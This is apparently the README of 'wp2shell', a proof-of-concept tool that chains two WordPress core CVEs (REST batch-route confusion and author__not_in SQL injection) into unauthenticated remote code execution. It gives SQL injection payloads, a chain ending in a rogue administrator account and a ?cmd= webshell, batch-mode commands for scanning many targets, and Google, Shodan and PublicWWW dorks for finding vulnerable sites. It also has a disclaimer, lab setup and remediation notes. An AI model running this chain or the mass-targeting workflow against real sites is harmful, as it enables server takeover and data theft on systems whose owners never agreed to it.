# wp2shell — WordPress Core Pre-Auth RCE Chain

PoC for the chained **CVE-2026-63030** (REST API batch-route confusion) and
**CVE-2026-60137** (`author__not_in` SQL injection) vulnerabilities in
WordPress core — a stock install, no plugins, no authentication required,
ending in remote code execution.

```
  ███████╗  █████╗  ██╗  ██╗ ███╗   ███╗ ███████╗ ███████╗  ██████╗
  ██╔════╝ ██╔══██╗ ██║  ██║ ████╗ ████║ ██╔════╝ ██╔════╝ ██╔════╝
  ███████╗ ███████║ ███████║ ██╔████╔██║ ███████╗ █████╗   ██║
  ╚════██║ ██╔══██║ ██╔══██║ ██║╚██╔╝██║ ╚════██║ ██╔══╝   ██║
  ███████║ ██║  ██║ ██║  ██║ ██║ ╚═╝ ██║ ███████║ ███████╗ ╚██████╗
  ╚══════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝     ╚═╝ ╚══════╝ ╚══════╝  ╚═════╝
      wp2shell | CVE-2026-63030 + CVE-2026-60137 Pre-Auth RCE Chain
                          github.com/sahmsec
```

## ⚠️ Legal disclaimer

This proof of concept is provided **for authorized security research,
education, and defensive testing only**.

- You must **own the target system** or hold **explicit written permission**
  from its owner before running this tool against it.
- Unauthorized access to computer systems is illegal in most jurisdictions
  (e.g., the Computer Fraud and Abuse Act in the US, the Computer Misuse Act
  in the UK, and similar laws worldwide) and may carry criminal and civil
  penalties.
- The authors assume **no liability** for any misuse, damage, or legal
  consequences arising from the use of this code.
- By using this software you agree to use it responsibly and in compliance
  with all applicable laws.

## Affected versions

| CVE | Component | Affected | Fixed |
|---|---|---|---|
| CVE-2026-63030 | REST API batch endpoint route confusion | 6.9.0–6.9.4, 7.0.0–7.0.1 | 6.9.5, 7.0.2 |
| CVE-2026-60137 | Unsanitised `author__not_in` in WP_Query | 6.8.x < 6.8.6, 6.9.x < 6.9.5, 7.0.x < 7.0.2 | 6.8.6, 6.9.5, 7.0.2 |

Preconditions: none. Unauthenticated, default configuration, works with or
without pretty permalinks (`/wp-json/batch/v1` and `/?rest_route=/batch/v1`).

## Root cause

`WP_REST_Server::serve_batch_request_v1()` keeps three parallel lists —
`$requests`, `$validation`, `$matches` — and relies on them staying
index-aligned. A sub-request that fails to parse (e.g. path `///`) is
recorded in `$validation` but **not** in `$matches`, so every following
sub-request is dispatched against the next sub-request's route *and*
permission callback:

```php
foreach ( $requests as $single_request ) {
    if ( is_wp_error( $single_request ) ) {
        $validation[] = $single_request;   // recorded here...
        continue;                          // ...but NOT in $matches
    }
    $matches[] = $this->match_request_to_handler( $single_request );
}
// later, during dispatch:
$match = $matches[ $i ];                  // off by one after any error
list( $route, $handler ) = $match;        // wrong permission check applied
```

The fix (6.9.5 / 7.0.2) keeps the arrays aligned and adds a re-entrancy
guard so a sub-request cannot start a fresh REST cycle mid-dispatch.

Chained to the unsanitised `author__not_in` parameter (mapped from the REST
`author_exclude` param), the confusion gives an unauthenticated attacker
full SQL injection on the posts table, which is escalated to RCE through
the sequence below.

## Attack chain

1. **Route confusion** — a parse-failed primer (`POST ///`) desyncs batch
   dispatch so later sub-requests run against the wrong handlers.
2. **Blind SQLi** — `author_exclude=0) AND (<cond>)-- -` gives a boolean
   oracle on rows present/absent → extract `DATABASE()`, `CURRENT_USER()`,
   table names and IDs (binary-search per character).
3. **UNION SQLi** — a 23-column `UNION ALL SELECT` shaped like `wp_posts`
   injects fake rows into post listings; values are exfiltrated through the
   title column as `||HEX(value)||`.
4. **oEmbed cache poisoning** — injected posts carrying `[embed]` shortcodes
   are rendered through the desynced widgets endpoint; WordPress fetches the
   embed URLs (attacker-chosen URL fragments) and stores `oembed_cache`
   posts with a predictable `post_name = md5(url . serialize(args))`. Their
   IDs are read back via the SQLi.
5. **Graph poisoning** — UNION-injected fake posts form a
   `customize_changeset` + loopback `request` + `nav_menu_item` graph whose
   author is an existing administrator; the trailing `POST /wp/v2/users`
   inside the batch then executes in the poisoned loopback context and
   creates the attacker's administrator account.
6. **RCE** — log in as the new admin, upload a plugin zip containing the
   webshell, and run commands via `?cmd=`.

## Usage

```bash
# single target
python script.py --target https://target.example --command "id"

# batch mode (one URL per line)
python script.py --list targets.txt --command "id" --threads 10 --out results.json
```

Options: `--debug` (verbose requests), `--no-banner`, `--out` (JSON report).

Verified output against a local WordPress 6.9.4 lab:

```
[+] vulnerable (batch route confusion active)
[+] blind SQLi OK | db=wordpress user=wp@%
[+] admin created: sahmsec_a6746845a9f6 / sahmsec!GDtoBz7VYMeoKClM1I9e
[+] webshell: http://localhost/wp-content/plugins/ek517rb/ek517rb.php?cmd=<command>
[+] command output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The patched core (6.9.5+) answers the route-confusion probe with
`rest_term_invalid` instead of `block_cannot_read`, so the tool exits with
`NOT vulnerable` — the detection is deterministic and non-destructive.

## Target discovery (dorks)

Google / Bing:

```
"WordPress 6.9.4" inurl:wp-login.php
"name=generator" "WordPress 6.9.4"
"WordPress 6.9.3" OR "WordPress 6.9.4" -"6.9.5"
"WordPress 7.0.1" inurl:wp-content
```

Shodan:

```
http.html:"WordPress 6.9.4"
http.title:"Just another WordPress site" http.html:"ver=6.9.4"
```

PublicWWW (one per version; the `?ver=` / `wordpress.org/?v=` variants catch
sites that strip the generator meta tag):

```
content="WordPress 6.9.0"
content="WordPress 6.9.1"
content="WordPress 6.9.2"
content="WordPress 6.9.3"
content="WordPress 6.9.4"
content="WordPress 7.0.0"
content="WordPress 7.0.1"

content='WordPress 6.9.4'
content='WordPress 7.0.1'

?ver=6.9.4
ver=6.9.3
ver=7.0.1
wp-includes/css/dist/block-library/style.min.css?ver=6.9.4

wordpress.org/?v=6.9.4
wordpress.org/?v=7.0.1
```

Workflow: collect URLs → strip to base domains → dedupe → verify
non-destructively:

```bash
python script.py --check-only --list domains.txt
```

The version in a dork is only a hint — the `--check-only` probe is the ground
truth (WAFs, security plugins and hardened loopbacks can kill the chain on a
vulnerable version, and 6.8.x has the SQLi but not the route confusion).
Only run the full chain against targets you own or are authorized to test.

## Lab reproduction

```bash
cd lab && docker compose up -d
docker compose run --rm wpcli core install --url=http://localhost \
    --title="WP2Shell Lab" --admin_user=admin --admin_password=admin123! \
    --admin_email=admin@lab.local --skip-email
cd .. && python script.py --target http://localhost --command "id"
```

Note: the lab installs the site at `http://localhost` (port 80) so the
server-side oEmbed loopback fetch can reach itself — a lab-only requirement.
Attacker-facing ports are 80 and 8091.

## Remediation

- Update WordPress core to **6.9.5 / 7.0.2+** immediately.
- Until patched, block unauthenticated access to both `/wp-json/batch/v1`
  and `/?rest_route=/batch/v1` at the WAF or web server.
- After any suspected compromise: audit `wp_users` for unknown
  administrators and `wp-content/plugins/` for unknown files.

---

**For authorized security research and lab use only.**
